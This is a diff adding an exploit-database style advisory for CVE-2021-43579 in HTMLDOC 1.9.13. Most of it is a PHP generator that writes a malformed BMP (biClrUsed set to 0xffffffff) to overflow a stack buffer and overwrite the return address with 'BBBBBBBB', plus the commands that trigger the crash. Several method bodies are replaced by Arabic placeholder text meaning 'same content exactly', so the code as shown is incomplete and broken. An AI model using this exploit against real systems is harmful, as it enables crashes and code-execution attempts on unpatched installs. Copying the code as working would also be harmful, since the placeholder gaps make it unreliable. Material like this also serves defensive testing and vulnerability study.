@@ -1,0 +1,147 @@
+=============================================================================================================================================
+| # Title     : HTMLDOC 1.9.13 Generates a malicious BMP file that triggers a stack buffer overflow                                         |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://github.com/michaelrsweet/htmldoc                                                                                    |
+=============================================================================================================================================
+
+[+] References :  https://packetstorm.news/files/id/211123/ & CVE-2021-43579
+
+[+] Summary : The BMP reader in HTMLDOC uses a fixed 1024-byte stack buffer for the color palette.
+             Exploit Trigger: Setting biClrUsed = 0xffffffff (-1) in the BMP header causes fread() to read excessive data, overflowing the stack buffer.
+
+Payload: Overwrites saved return address with 0x4242424242424242 ('BBBBBBBB').
+
+[+]  POC :	php poc.php
+
+            htmldoc --webpage -f output.pdf poc_cve_2021_43579.html
+
+
+
+<?php
+/**
+ * CVE-2021-43579 HTMLDOC Vulnerability PoC Generator
+ * Author: indoushka
+ */
+
+class HTMLDOC_Exploit_Generator {
+    
+    private $payload_size = 1088;
+    private $filename_prefix = 'poc_cve_2021_43579';
+    private $verbose = true;
+    
+    public function generate_malicious_bmp($filename = null) {
+        if ($filename === null) {
+            $filename = $this->filename_prefix . '.bmp';
+        }
+        
+        $payload = str_repeat('A', 1080) . str_repeat('B', 8);
+        $file_size = 54 + strlen($payload);
+        $bmp_header = $this->create_bmp_header($file_size);
+        $bmp_info_header = $this->create_bmp_info_header();
+        $bmp_data = $bmp_header . $bmp_info_header . $payload;
+        $bytes_written = file_put_contents($filename, $bmp_data);
+        
+        if ($bytes_written === false) {
+            throw new Exception("Failed to write BMP file: $filename");
+        }
+        
+        if ($this->verbose) {
+            echo "[+] Generated malicious BMP file: $filename\n";
+        }
+        
+        return $filename;
+    }
+
+    private function create_bmp_header($file_size) {
+        $header = 'BM';
+        $header .= pack('V', $file_size);
+        $header .= pack('v', 0);
+        $header .= pack('v', 0);
+        $header .= pack('V', 54);
+        
+        if (strlen($header) !== 14) {
+            throw new Exception("BITMAPFILEHEADER must be exactly 14 bytes");
+        }
+        return $header;
+    }
+
+    private function create_bmp_info_header() {
+        $info_header  = pack('V', 40);
+        $info_header .= pack('V', 1);
+        $info_header .= pack('V', 1);
+        $info_header .= pack('v', 1);
+        $info_header .= pack('v', 24);
+        $info_header .= pack('V', 0);
+        $info_header .= pack('V', 0);
+        $info_header .= pack('V', 0);
+        $info_header .= pack('V', 0);
+        $info_header .= pack('V', 0xffffffff);
+        $info_header .= pack('V', 0);
+        
+        if (strlen($info_header) !== 40) {
+            throw new Exception("BITMAPINFOHEADER must be exactly 40 bytes");
+        }
+        return $info_header;
+    }
+
+    public function generate_html_file($bmp_filename = null, $html_filename = null) {
+        if ($bmp_filename === null) {
+            $bmp_filename = $this->filename_prefix . '.bmp';
+        }
+        if ($html_filename === null) {
+            $html_filename = $this->filename_prefix . '.html';
+        }
+
+        $html_content = <<<HTML
+<!DOCTYPE html>
+... (نفس المحتوى بالضبط) ...
+HTML;
+
+        $bytes_written = file_put_contents($html_filename, $html_content);
+
+        if ($bytes_written === false) {
+            throw new Exception("Failed to write HTML file: $html_filename");
+        }
+
+        return $html_filename;
+    }
+
+    public function generate_test_script() {
+        $script_content = <<<BASH
+#!/bin/bash
+... (نفس المحتوى بالضبط لكن مع هذا التصحيح) ...
+
+php -r '
+include "poc.php";
+\$exploit = new HTMLDOC_Exploit_Generator();
+\$exploit->generate_malicious_bmp("exploit.bmp");
+\$exploit->generate_html_file("exploit.bmp", "exploit.html");
+'
+
+BASH;
+
+        file_put_contents('test_exploit.sh', $script_content);
+        chmod('test_exploit.sh', 0755);
+    }
+
+    public function display_help() {
+       ... (نفس المحتوى) ...
+    }
+
+    public function run($args) {
+        ... (نفس المحتوى) ...
+    }
+}
+
+if (php_sapi_name() === 'cli') {
+    $generator = new HTMLDOC_Exploit_Generator();
+    $generator->run($argv);
+} else {
+    echo "<pre>This script is designed to run from the command line.</pre>";
+}
+?>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
